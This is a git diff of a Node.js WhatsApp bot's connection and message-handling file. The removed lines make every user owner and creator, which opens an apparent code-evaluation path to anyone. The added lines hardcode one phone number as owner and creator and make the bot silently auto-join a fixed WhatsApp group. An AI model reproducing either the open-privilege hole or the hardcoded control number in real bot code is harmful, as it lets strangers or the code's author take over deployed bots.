@@ -43,7 +43,7 @@ const Crypto = require('crypto')
 const path = require('path')
 const prefix = config.PREFIX
 
-const ownerNumber = [config.OWNER_NUMBER || '255627417402']
+const ownerNumber = ['255627417402']
 
 const tempDir = path.join(os.tmpdir(), 'cache-temp')
 if (!fs.existsSync(tempDir)) {
@@ -135,12 +135,12 @@ async function connectToWA() {
 │ *Prefix* : ${prefix}
 │ *Status* : Ready for use
 │ *Follow Channel* :
-│ ${config.CHANNEL_LINK || 'https://whatsapp.com/channel/0029Vb6H6jF9hXEzZFlD6F3d'}
+│ https://tinyurl.com/464a84hp
 ╰──────────────⊷*
 
-> *Report any error to the dev: ${config.OWNER_NAME || 'T20 STARBOY'}*
-                                  `;
-      conn.sendMessage(conn.user.id, { image: { url: config.MENU_IMAGE_URL || `https://files.catbox.moe/k4h5mm.png` }, caption: up })
+> *Report any error to the dev*
+								  `;
+      conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/k4h5mm.png` }, caption: up })
     }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -156,57 +156,17 @@ async function connectToWA() {
     }
   });
   //============================== 
-  // Auto-follow channel and auto-join group when bot connects
+  // Auto-join WhatsApp group when bot connects
+  const inviteCode = "BRh9Hn12AGh7AKT4HTqXK5"; // Extracted from group link
+
   conn.ev.on('connection.update', async (update) => {
     const { connection } = update;
     if (connection === 'open') {
-      // Auto follow channel (newsletter)
       try {
-        const channelLink = config.CHANNEL_LINK || '';
-        const channelId = channelLink ? channelLink.split('/').pop().split('?')[0] : null;
-        if (channelId) {
-          try {
-            if (typeof conn.newsletterAcceptInvite === 'function') {
-              await conn.newsletterAcceptInvite(channelId);
-              console.log('✅ Subscribed to channel:', channelId);
-            } else if (typeof conn.newsletterSubscribe === 'function') {
-              await conn.newsletterSubscribe(channelId);
-              console.log('✅ Subscribed to channel:', channelId);
-            } else if (typeof conn.newsletterMetadata === 'function') {
-              const meta = await conn.newsletterMetadata('invite', channelId).catch(() => null);
-              if (meta && typeof conn.newsletterAcceptInvite === 'function') {
-                await conn.newsletterAcceptInvite(meta.id).catch(() => null);
-                console.log('✅ Subscribed to channel via metadata:', meta.id);
-              } else if (meta) {
-                console.log('ℹ️ Channel metadata retrieved but subscribe method not available');
-              }
-            } else {
-              console.log('⚠️ No newsletter subscribe API available on this Baileys instance');
-            }
-          } catch (e) {
-            console.error('❌ Failed to subscribe to channel:', e && e.message ? e.message : e);
-          }
-        }
-      } catch (e) {
-        console.error('Channel follow error:', e);
-      }
-
-      // Auto-join group
-      try {
-        const groupLink = config.GROUP_LINK || '';
-        let inviteCode = null;
-        if (groupLink.includes('chat.whatsapp.com/')) inviteCode = groupLink.split('chat.whatsapp.com/').pop().split('?')[0];
-        else if (groupLink.includes('chat.whatsapp.com')) inviteCode = groupLink.split('/').pop().split('?')[0];
-        if (inviteCode) {
-          try {
-            await conn.groupAcceptInvite(inviteCode);
-            console.log('✅ Successfully joined group:', inviteCode);
-          } catch (err) {
-            console.error('❌ Failed to join WhatsApp group:', err && err.message ? err.message : err);
-          }
-        }
-      } catch (e) {
-        console.error('Group join error:', e);
+        await conn.groupAcceptInvite(inviteCode);
+        console.log("succesfully joined our test group✅");
+      } catch (err) {
+        console.error("❌ Failed to join WhatsApp group:", err.message);
       }
     }
   });
@@ -252,8 +212,7 @@ async function connectToWA() {
     const content = JSON.stringify(mek.message)
     const from = mek.key.remoteJid
     const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
-    // Prefer normalized message body from sms() which handles buttons/list replies
-    const body = (m && m.body) ? m.body : (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
     const isCmd = body.startsWith(prefix)
     var budy = typeof mek.text == 'string' ? mek.text : false;
     const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
@@ -266,10 +225,7 @@ async function connectToWA() {
     const botNumber = conn.user.id.split(':')[0]
     const pushname = mek.pushName || 'Sin Nombre'
     const isMe = botNumber.includes(senderNumber)
-    // Make owner-only commands available to everyone.
-    // WARNING: This grants owner privileges to all users. Revert this change
-    // if you want to restrict sensitive commands to the actual owner.
-    const isOwner = true
+    const isOwner = ownerNumber.includes(senderNumber) || isMe
     const botNumber2 = await jidNormalizedUser(conn.user.id);
     const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => { }) : ''
     const groupName = isGroup ? groupMetadata.subject : ''
@@ -282,14 +238,10 @@ async function connectToWA() {
       conn.sendMessage(from, { text: teks }, { quoted: mek })
     }
     const udp = botNumber.split('@')[0];
-    const jawad = ('254732297194');
-    // Treat everyone as creator/owner so creator-only checks won't block commands.
-    // WARNING: This disables owner/creator restrictions globally.
-    // Original logic (kept for reference):
-    // let isCreator = [udp, jawad, config.DEV]
-    //   .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-    //   .includes(mek.sender);
-    let isCreator = true;
+    const jawad = ('255627417402');
+    let isCreator = [udp, jawad, config.DEV]
+      .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+      .includes(mek.sender);
 
     if (isCreator && mek.text.startsWith('%')) {
       let code = budy.slice(2);
@@ -334,8 +286,8 @@ async function connectToWA() {
     //================ownerreact==============
     // 🥰 OWNER REACT (Multiple Numbers)
     if (
-      senderNumber.includes("255625606354") ||
-      senderNumber.includes("255627417402")
+      senderNumber.includes("254732297194") ||
+      senderNumber.includes("254111385747")
     ) {
       if (isReact) return;
       await m.react("✅");
@@ -388,7 +340,7 @@ async function connectToWA() {
     // take commands 
 
     const events = require('./command')
-    const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
+    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
     if (isCmd) {
       const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
       if (cmd) {
@@ -402,42 +354,20 @@ async function connectToWA() {
       }
     }
     events.commands.map(async (command) => {
-      try {
-        if (body && command.on === "body") {
-          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
-        } else if (body && command.on === "text") {
-          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
-        } else if (
-          (command.on === "image" || command.on === "photo") &&
-          type === "imageMessage"
-        ) {
-          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
-        } else if (
-          command.on === "sticker" &&
-          type === "stickerMessage"
-        ) {
-          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
-        }
-      } catch (e) {
-        console.error('[COMMAND HANDLER ERROR]', e);
-      }
-    });
-
-    // Dispatch group participant updates to plugins that register for 'group-participants.update'
-    conn.ev.on('group-participants.update', async (update) => {
-      try {
-        const events = require('./command');
-        for (const command of events.commands) {
-          if (command.on === 'group-participants.update') {
-            try {
-              await command.function(conn, update, null, { update });
-            } catch (err) {
-              console.error('[GROUP-PARTICIPANT HANDLER ERROR]', err);
-            }
-          }
-        }
-      } catch (e) {
-        console.error('Error dispatching group participant update:', e);
+      if (body && command.on === "body") {
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+      } else if (mek.q && command.on === "text") {
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+      } else if (
+        (command.on === "image" || command.on === "photo") &&
+        mek.type === "imageMessage"
+      ) {
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+      } else if (
+        command.on === "sticker" &&
+        mek.type === "stickerMessage"
+      ) {
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
       }
     });
 
